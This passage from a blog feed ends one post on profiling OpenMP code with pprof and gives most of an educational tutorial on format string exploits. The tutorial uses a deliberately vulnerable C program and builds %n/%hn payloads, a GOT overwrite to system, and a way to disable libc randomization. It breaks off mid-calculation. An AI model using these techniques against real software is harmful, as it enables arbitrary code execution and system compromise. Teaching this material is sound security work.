&lt;span class="go"&gt;      25   1.8%  99.7%       25   1.8% is_complete_col&lt;/span&gt;
&lt;span class="go"&gt;       3   0.2%  99.9%      749  54.2% _Z28backtrack_row_solve_paralleliiiPiPS_S0_._omp_fn.0&lt;/span&gt;
&lt;span class="go"&gt;       1   0.1% 100.0%     1328  96.1% GOMP_taskwait&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%        1   0.1% GOMP_loop_dynamic_start&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%     1258  91.0% __clone&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% __libc_start_main&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% _start&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% backtrack_row_solve_parallel&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% backtrack_solve&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% main&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      124   9.0% solve&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%     1258  91.0% start_thread&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This was clearly not right, so I spent some time digging around. If we look at 
the callgraph to find which functions call &lt;code&gt;omp_get_num_procs&lt;/code&gt;, we see that the 
culprit is &lt;code&gt;GOMP_taskwait&lt;/code&gt;: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; pprof --gv --focus&lt;span class="o"&gt;=&lt;/span&gt;omp_get_num_procs solver out.prof
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="omp_get_num_procs call graph" src="https://codearcana.com/images/omp_get_num_procs.png" title="omp_get_num_procs call graph"&gt;&lt;/p&gt;
&lt;p&gt;We cannot view annotated source for this function (since we don't have source),
but we &lt;em&gt;can&lt;/em&gt; look at the annotated disassembly. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; pprof --disas&lt;span class="o"&gt;=&lt;/span&gt;GOMP_taskwait solver out.prof 
&lt;span class="go"&gt;ROUTINE ====================== GOMP_taskwait&lt;/span&gt;
&lt;span class="go"&gt;     1   1330 samples (flat, cumulative) 96.2% of total&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;     .     16        84ef: callq  9ca0 &amp;lt;omp_get_num_procs+0x540&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     .      .        84f4: nopl   0x0(%rax)&lt;/span&gt;
&lt;span class="go"&gt;     .      .        84f8: mov    %fs:0x10(%rbx),%r13&lt;/span&gt;
&lt;span class="go"&gt;     .      .        84fd: mov    %r12,%rdi&lt;/span&gt;
&lt;span class="go"&gt;     .    695        8500: callq  *%rbp&lt;/span&gt;
&lt;span class="go"&gt;     .      .        8502: lea    0x80(%r13),%rdi&lt;/span&gt;
&lt;span class="go"&gt;     .    391        8509: callq  9b40 &amp;lt;omp_get_num_procs+0x3e0&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;     .      .        850e: mov    %r14,%rdi&lt;/span&gt;
&lt;span class="go"&gt;     .    156        8511: callq  9ca0 &amp;lt;omp_get_num_procs+0x540&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aha! The functions are being poorly identified, so it appears that &lt;em&gt;all&lt;/em&gt; calls to OpenMP library functions are being understood as calls to &lt;code&gt;omp_get_num_procs&lt;/code&gt;. Unfortunately, there is nothing we can do about it - that library does not export any symbols:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ldd solver &lt;span class="p"&gt;|&lt;/span&gt; grep gomp
&lt;span class="go"&gt;    libgomp.so.1 =&amp;gt; /usr/lib64/libgomp.so.1 (0x00007f19e9109000)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; nm /usr/lib64/libgomp.so.1
&lt;span class="go"&gt;nm: /usr/lib64/libgomp.so.1: no symbols&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At least now why &lt;code&gt;omp_get_num_threads&lt;/code&gt; is reported so much! We probably need to count all calls to &lt;code&gt;omp_get_num_threads&lt;/code&gt; as 'overhead from OpenMP' but otherwise not trust the specific counts.
In my opinion, the profiler should emit function addresses 
for functions that don't map to some symbol, but I understand that is hard. For now, we will get more meaningful profiling data about our code if we do:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; pprof --text --ignore&lt;span class="o"&gt;=&lt;/span&gt;omp_get_num_procs solver out.prof 
&lt;span class="go"&gt;Using local file solver.&lt;/span&gt;
&lt;span class="go"&gt;Using local file out.prof.&lt;/span&gt;
&lt;span class="go"&gt;Removing _L_unlock_16 from all stack traces.&lt;/span&gt;
&lt;span class="go"&gt;Total: 1382 samples&lt;/span&gt;
&lt;span class="go"&gt;     283  37.8%  37.8%      283  37.8% is_complete_row&lt;/span&gt;
&lt;span class="go"&gt;     226  30.2%  68.0%      226  30.2% partial_check_col&lt;/span&gt;
&lt;span class="go"&gt;     102  13.6%  81.6%      744  99.3% backtrack_row_solve&lt;/span&gt;
&lt;span class="go"&gt;      42   5.6%  87.2%       85  11.3% partial_check_row&lt;/span&gt;
&lt;span class="go"&gt;      41   5.5%  92.7%      351  46.9% partial_check&lt;/span&gt;
&lt;span class="go"&gt;      26   3.5%  96.1%      292  39.0% complete_and_check_puzzle&lt;/span&gt;
&lt;span class="go"&gt;      25   3.3%  99.5%       25   3.3% is_complete_col&lt;/span&gt;
&lt;span class="go"&gt;       3   0.4%  99.9%      748  99.9% _Z28backtrack_row_solve_paralleliiiPiPS_S0_._omp_fn.0&lt;/span&gt;
&lt;span class="go"&gt;       1   0.1% 100.0%      695  92.8% GOMP_taskwait&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      694  92.7% __clone&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% __libc_start_main&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% _start&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% backtrack_row_solve_parallel&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% backtrack_solve&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% main&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% solve&lt;/span&gt;
&lt;span class="go"&gt;       0   0.0% 100.0%      694  92.7% start_thread  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="profiling"></category></entry><entry><title>Introduction to format string exploits</title><link href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" rel="alternate"></link><published>2013-05-02T00:00:00-07:00</published><updated>2013-05-02T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-02:/posts/2013/05/02/introduction-to-format-string-exploits.html</id><summary type="html">&lt;p&gt;A brief introduction to format string exploits.&lt;/p&gt;</summary><content type="html">&lt;p&gt;It would be helpful to be familiar with the x86 calling conventions before reading this tutorial. I prepared a brief primer &lt;a href="https://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html"&gt;here&lt;/a&gt; and you are encouraged to learn more on your own.&lt;/p&gt;
&lt;h1&gt;How do format strings vulnerabilities work?&lt;/h1&gt;
&lt;p&gt;Format string vulnerabilities are a pretty silly class of bug that take advantage of an easily avoidable programmer error.
If the programmer passes an attacker-controlled buffer as the argument to a &lt;code&gt;printf&lt;/code&gt; 
(or any of the related functions, including &lt;code&gt;sprintf&lt;/code&gt;, &lt;code&gt;fprintf&lt;/code&gt;, etc), the attacker can perform
writes to arbitrary memory addresses. The following program contains such an error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;strncpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since &lt;code&gt;printf&lt;/code&gt; has a variable number of arguments, it must use the format string to determine the number of arguments.
In the case above, the attacker can pass the string &lt;code&gt;"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"&lt;/code&gt; and fool the &lt;code&gt;printf&lt;/code&gt; into thinking it has 15
arguments. It will naively print the next 15 addresses on the stack, thinking they are its arguments:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;0xffffdddd 0x64 0xf7ec1289 0xffffdbdf 0xffffdbde (nil) 0xffffdcc4 0xffffdc64 (nil) 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At about 10 arguments up the stack, we can see a repeating pattern of &lt;code&gt;0x252070&lt;/code&gt; - those are our &lt;code&gt;%p&lt;/code&gt;s on the stack! We start our string
with &lt;code&gt;AAAA&lt;/code&gt; to see this more explicitly:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;AAAA%p %p %p %p %p %p %p %p %p %p&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAA0xffffdde8 0x64 0xf7ec1289 0xffffdbef 0xffffdbee (nil) 0xffffdcd4 0xffffdc74 (nil) 0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;0x41414141&lt;/code&gt; is the hex representation of &lt;code&gt;AAAA&lt;/code&gt;. We now have a way to pass an
arbitrary value (in this case, we're passing &lt;code&gt;0x41414141&lt;/code&gt;) as an argument to &lt;code&gt;printf&lt;/code&gt;. At this point we will take
advantage of another format string feature: in a format specifier, we can also select a specific argument. For example,
&lt;code&gt;printf("%2$x", 1, 2, 3)&lt;/code&gt; will print 2. In general, we can do &lt;code&gt;printf("%&amp;lt;some number&amp;gt;$x")&lt;/code&gt; to select an arbitrary argument
to &lt;code&gt;printf&lt;/code&gt;. In our case, we see that &lt;code&gt;0x41414141&lt;/code&gt; is the 10th argument to &lt;code&gt;printf&lt;/code&gt;, so we can simplify our string&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s1"&gt;&amp;#39;AAAA%10$p&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;AAAA0x41414141&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So how do we turn this into an arbitrary write primitive? Well, &lt;code&gt;printf&lt;/code&gt; has a &lt;em&gt;really interesting&lt;/em&gt; format specifier: &lt;code&gt;%n&lt;/code&gt;.
From the man page of &lt;code&gt;printf&lt;/code&gt;: &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The number of characters written so far is stored into the  integer indicated  by the int * (or variant) pointer argument.  No argument is converted.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we were to pass the string &lt;code&gt;AAAA%10$n&lt;/code&gt;, we would write the value 4 to the address &lt;code&gt;0x41414141&lt;/code&gt;! We can use another 
&lt;code&gt;printf&lt;/code&gt; feature to write larger values: if we do &lt;code&gt;printf("AAAA%100x")&lt;/code&gt;, 104 characters will be output 
(because &lt;code&gt;%100x&lt;/code&gt; prints the argument padded to at least 100 characters). We can do &lt;code&gt;AAAA%&amp;lt;value-4&amp;gt;x%10$n&lt;/code&gt; to write an
arbitrary value to &lt;code&gt;0x41414141&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The next thing to know is that almost certainly don't want to write all characters in one go: for example, 
if we want to write the value &lt;code&gt;0x0804a004&lt;/code&gt;, we would have to write 134520836 characters to standard out! Instead,
we break it up into two writes: first we write &lt;code&gt;0x0804&lt;/code&gt; (2052) to the higher two bytes of the target address and then we 
write &lt;code&gt;0xa004&lt;/code&gt; (40964) to the lower two bytes of the target address. To do this, we will use &lt;code&gt;%hn&lt;/code&gt; to write only 2 bytes
at a time. Such a format string might look like this: &lt;code&gt;CAAAAAAA%2044x%10$hn%38912x%11$hn&lt;/code&gt;. Lets break this down so we can
understand it.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;CAAAAAAA&lt;/code&gt; - this is the higher two bytes of the target address (&lt;code&gt;0x41414143&lt;/code&gt;) 
      and the lower two bytes of the target address (&lt;code&gt;0x41414141&lt;/code&gt;) &lt;/li&gt;
&lt;li&gt;&lt;code&gt;%2044x%10$hn&lt;/code&gt; - since we want to have written a total of 2052 bytes when we get to the 
      first &lt;code&gt;%hn&lt;/code&gt;, and we have already written 8 bytes so far, we need to write an addition
      2044 bytes.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%38912x%11$hn&lt;/code&gt; - since we want to have written a total of 40964 bytes when we get to the
      second &lt;code&gt;%hn&lt;/code&gt;, and we since we have already written 2052 bytes so far, we need to write
      an additional 38912 bytes.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here is an example of how this might be used &lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;./a.out &amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;CAAAAAAA%2044x%10$hn%38912x%11$hn&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;What can we do with them?&lt;/h1&gt;
&lt;p&gt;Since a format string vulnerability gives us the ability to write an arbitrary value 
to an arbitrary address, we can do a lot of things with it. Usually the easiest thing to do is
write to a function pointer somewhere and turn our arbitrary write primitive 
into arbitrary code execution. In dynamically linked programs, these are easy to find.
When a program attempts to execute a function in a shared library, it does not necessarily
know the location of that function at compile time. Instead, it jumps to a stub function that has a pointer
to the correct location of the function in the shared library. This pointer (located in the global offset table, or GOT)
is initialized at runtime when the stub function is first called. &lt;/p&gt;
&lt;p&gt;For example, when &lt;code&gt;strcat&lt;/code&gt; is used in a program, the
following piece of stub code allows the program to find the correct location in the shared library &lt;code&gt;libc&lt;/code&gt; at run time:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -d a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;08048330 &amp;lt;strcat@plt&amp;gt;:&lt;/span&gt;
&lt;span class="go"&gt; 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004&lt;/span&gt;
&lt;span class="go"&gt; 8048336:       68 08 00 00 00          push   $0x8&lt;/span&gt;
&lt;span class="go"&gt; 804833b:       e9 d0 ff ff ff          jmp    8048310 &amp;lt;_init+0x3c&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here you can see that the &lt;code&gt;stcat@plt&lt;/code&gt; is the stub function that jumps to GOT entry for &lt;code&gt;strcat&lt;/code&gt; (the address &lt;code&gt;0x804a004&lt;/code&gt;),
which is set at runtime to the location in &lt;code&gt;libc&lt;/code&gt; of the &lt;code&gt;strcat&lt;/code&gt; function. We can write any value we want
to &lt;code&gt;0x804a004&lt;/code&gt;. When &lt;code&gt;strcat&lt;/code&gt; is used later in the program, the program will instead transfer code execution
to the value we specified. A common technique is to overwrite the GOT entry with the address of the function &lt;code&gt;system&lt;/code&gt;, 
thereby turning a call of &lt;code&gt;strcat(buffer, "hello")&lt;/code&gt; into the call &lt;code&gt;system(buffer)&lt;/code&gt; (if we can control the contents 
of &lt;code&gt;buffer&lt;/code&gt;, we can get a shell!).&lt;/p&gt;
&lt;h1&gt;An example&lt;/h1&gt;
&lt;p&gt;For an example, we will exploit the following C program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="c1"&gt;// compile with gcc -m32 temp.c&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
  &lt;span class="n"&gt;strdup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Our plan is going to be to overwrite the GOT entry of &lt;code&gt;strdup&lt;/code&gt; with the address of &lt;code&gt;system&lt;/code&gt;, so the program
will &lt;code&gt;printf(argv[1])&lt;/code&gt; then &lt;code&gt;system(argv[1])&lt;/code&gt;. Hence, our payload must be a valid argument to &lt;code&gt;system&lt;/code&gt; - we will
start our payload with &lt;code&gt;sh;#&lt;/code&gt; (which will be &lt;code&gt;sh&lt;/code&gt; and cause the rest of the payload to be a comment. 
This also has the advantage of being exactly 4 bytes long, which isn't important for this example 
but is very useful in other cases). &lt;/p&gt;
&lt;p&gt;For every format string exploit, our payload will eventually 
look something like this: &lt;code&gt;&amp;lt;address&amp;gt;&amp;lt;address+2&amp;gt;%&amp;lt;number&amp;gt;x%&amp;lt;offset&amp;gt;$hn%&amp;lt;other number&amp;gt;x%&amp;lt;offset+1&amp;gt;$hn&lt;/code&gt;. 
We prepare a payload that will be the same length as our final payload so we can start computing
the correct offsets and addresses (note that we use &lt;code&gt;%hp&lt;/code&gt; and &lt;code&gt;%00000x&lt;/code&gt; so we can just modify the string
in the last step without modifying its length):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#AAAABBBB%00000x%17$hp%00000x%18$hp&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00xf7fcbff48048449&lt;span class="o"&gt;(&lt;/span&gt;nil&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Our goal is to find the correct offsets (instead of 17 and 18) so that the we output &lt;code&gt;sh;#AAAABBBB&amp;lt;garbabe&amp;gt;0x41414141&amp;lt;garbage&amp;gt;0x42424242&lt;/code&gt;. 
This takes some work, but in our case the correct offsets are 99 and 100:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#AAAABBBB%00000x%99$hp%00000x%100$hp&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00x4141414180484490x42424242
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is important to note that our payload is &lt;em&gt;very&lt;/em&gt; sensitive to a change in length: adding one byte 
to the end of the string will change the required offsets and perhaps mess up the alignment.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#AAAABBBB%00000x%99$hp%00000x%100$hp&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;A&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00x2e00000080484490x6f2e612fA
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is because the arguments are passed onto the stack before the start of our program, and so changing the
length of the arguments will change their alignment and the initial stack location for the program itself. In
order to have our exploit work consistently, we need to ensure that the payload is at a consistent alignment 
(and at a consistent offset above us on the stack) by being careful to control the amount of stuff on the stack.
This is also why we are using &lt;code&gt;env -i&lt;/code&gt; as a wrapper for our program (it clears the environment, which is also 
passed onto the stack before the start of a program).&lt;/p&gt;
&lt;p&gt;Anyways, lets find the &lt;code&gt;strdup&lt;/code&gt; GOT entry:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -d a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;08048330 &amp;lt;strdup@plt&amp;gt;:&lt;/span&gt;
&lt;span class="go"&gt; 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004&lt;/span&gt;
&lt;span class="go"&gt; 8048336:       68 08 00 00 00          push   $0x8&lt;/span&gt;
&lt;span class="go"&gt; 804833b:       e9 d0 ff ff ff          jmp    8048310 &amp;lt;_init+0x3c&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we know where to write. We want to write the address of &lt;code&gt;system&lt;/code&gt; to the &lt;code&gt;strdup&lt;/code&gt; got entry, &lt;code&gt;0x804a004&lt;/code&gt;. 
For now, we plug in our address into the payload and make sure everything still works out:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;import sys; sys.stdout.write(&amp;quot;sh;#\x04\xa0\x04\x08\x06\xa0\x04\x08%00000x%99$hp%00000x%100$hp&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;sh;#&lt;/span&gt;00x804a00480484490x804a006
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The next step is to figure out where to write. First, since it is a 32 bit binary, we can disable libc randomization. 
We disable libc randomization via:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;ulimit&lt;/span&gt; -s unlimited
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now the address of &lt;code&gt;system&lt;/code&gt; is at a deterministic location in memory. 
We can just open up the program in &lt;code&gt;gdb&lt;/code&gt; and print the address of &lt;code&gt;system&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) b main&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8048417&lt;/span&gt;
&lt;span class="go"&gt;(gdb) r&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08048417 in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) p system&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x555c2250 &amp;lt;system&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, now we know that we need to write &lt;code&gt;0x555c2250&lt;/code&gt; (the address of system)
to the address &lt;code&gt;0x804a004&lt;/code&gt; (the got entry of &lt;code&gt;strdup&lt;/code&gt;). We are doing this in two parts. 
First, we write &lt;code&gt;0x2250&lt;/code&gt; to the two bytes at &lt;code&gt;0x804a004&lt;/code&gt; then we write &lt;code&gt;0x555c&lt;/code&gt; to
the two bytes at &lt;code&gt;0x804a006&lt;/code&gt;. We can figure out how many bytes to write in python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; 0x2250 - &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="c1"&gt;# We&amp;#39;ve already written 12 bytes (&amp;quot;sh;#AAAABBBB&amp;quot;).&lt;/span&gt;
&lt;span class="go"&gt;8772&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; 0x555c - 0x2250 &lt;span class="c1"&gt;# We&amp;#39;ve already written 0x2250 bytes.&lt;/span&gt;
